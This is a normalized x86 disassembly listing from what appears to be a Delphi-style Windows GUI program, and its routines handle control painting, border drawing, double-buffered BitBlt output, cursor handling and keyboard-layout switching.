dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_453e60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453e2f
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_4189b0
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_453e60
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_418a0c
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_4189b0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_417358
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_4189b0
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_423f34
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_417358
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_423f34
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_417358
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_44e190
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_450a20
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_454090
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_44e190
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_456054
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_456054
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_450a20
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_450a20
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_44e190
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_454090
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_4189b0
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_4541e4
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_453d08
jmp r-xdata
mov eax ebx
call sub_452d84
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_454336
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_456054
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_450a20
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_4541e4
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_456054
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_454344
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_453cd4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_454364
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_453cd4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4543d8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_453cd4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4543f8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_453cd4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_454418
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_453cd4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45443c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_453cd4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_454460
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_453cd4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_454484
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_453cd4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4544a8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_440198
mov edi eax
mov eax edi
call sub_440278
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_424bf4
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_456054
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_440378
jmp r-xdata
sub_454530
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_451354
test bl bl
je r-xdata
mov eax edi
call sub_456364
mov eax edi
call sub_455f5c
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_455f5c
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_4545f0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_450fb0
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_454640
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_456364
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_452914
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_4034ac
sub_454688
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_44f398
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_453940
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46ef8c
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46d474
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_4547d8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_4548b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4548be
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_456054
mov dl [ ebx + 0x184 ]
call sub_45acf8
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46d3ec
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_4080b0
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46d1ec
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46d1ec
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46d1ec
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_4548c4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_45494e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454955
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46d3ec
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_4080b0
test eax eax
je r-xdata
mov eax ebx
call sub_456054
mov dl 0x1
call sub_45acdc
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_4549b0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_417348
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_450a20
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_454a00
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_454a34
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_4034ac
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_4034ac
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_454a74
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_450a20
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_454acc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_421878
mov edx [ r-xdata ]
call sub_403460
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_454b04
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_4189b0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_454b28
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_456054
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_454b84
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_454af0
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_4189b0
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_454bc4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_40595c
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_40595c
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_454c30
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_454cd8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454cdf
lea eax [ ebp - 0x4 ]
call sub_405944
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_44d500
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_4032b0
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_405944
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_4034ac
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_40595c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ edi + 0x178 ] eax
sub_454ce8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_4528ec
xor edx edx
push ebp
push sub_454daa
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_4034ac
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454db1
mov eax [ ebp - 0x4 ]
call sub_4528f4
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_454db1
mov eax [ ebp - 0x4 ]
call sub_466768
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_44fab4
sub_454dfc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4031f8
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4516e0
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_454e66
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_4034ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_44fab4
sub_454e80
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_454ea8
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_466768
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_466670
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_4034ac
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_454ea8
test al al
jne r-xdata
sub_454f10
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_454ea8
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_4571c0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_454f3c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_454ea8
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_4571c0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
